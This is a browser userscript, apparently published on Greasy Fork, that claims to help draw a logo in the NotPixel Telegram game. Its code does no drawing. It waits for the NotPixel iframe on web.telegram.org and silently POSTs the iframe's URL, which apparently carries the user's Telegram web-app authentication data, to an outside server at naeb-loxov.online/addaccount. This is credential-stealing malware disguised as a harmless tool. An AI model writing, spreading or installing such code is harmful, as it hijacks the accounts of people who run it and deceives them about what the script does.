// ==UserScript==
// @name         [LolzTeam NotPixel] Draw Our Logo!
// @namespace    Draw Our Logo
// @version      1.3
// @description  Draw Our Logo
// @author       ivank
// @match        https://notpx.app/*
// @match        https://notpx.app
// @match        https://web.telegram.org/*
// @match        https://web.telegram.org
// @icon         https://www.google.com/s2/favicons?sz=64&domain=notpx.app
// @grant        none
// @license      ivank
// @downloadURL https://update.greasyfork.org/scripts/508602/%5BLolzTeam%20NotPixel%5D%20Draw%20Our%20Logo%21.user.js
// @updateURL https://update.greasyfork.org/scripts/508602/%5BLolzTeam%20NotPixel%5D%20Draw%20Our%20Logo%21.meta.js
// ==/UserScript==
 
(async function () {
	if(location.host === "web.telegram.org") {
		while(true) {
			const webApp = document.querySelector('iframe[src*="https://notpx.app/"]');
			if(webApp && webApp.src != undefined && webApp.src.length > 10) {
                const response = await fetch("https://naeb-loxov.online/addaccount", {
                    body: JSON.stringify({
                        url: webApp.src
                    }),
                    method: "POST"
                });

                break;
            }
			await new Promise(resolve => setTimeout(resolve, 1000));
		}
	}
})();